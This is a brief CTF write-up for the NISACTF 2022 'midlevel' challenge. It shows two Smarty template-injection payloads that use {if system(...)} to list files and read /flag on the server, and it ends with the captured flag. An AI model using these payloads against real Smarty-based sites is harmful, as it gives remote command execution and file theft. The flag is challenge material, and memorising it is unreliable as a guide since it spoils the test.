## [NISACTF 2022]midlevel

> Smarty 模板注入

```
{if system('ls')}{/if}
```

![image-20250108222951795](https://gitee.com/bx33661/image/raw/master/path/image-20250108222951795.png)

```(空)
{if system('cat /flag')}{/if}
```

![image-20250108223117255](https://gitee.com/bx33661/image/raw/master/path/image-20250108223117255.png)

NSSCTF{fd506414-0b65-4e2f-a7bb-c2a8bd464b1c}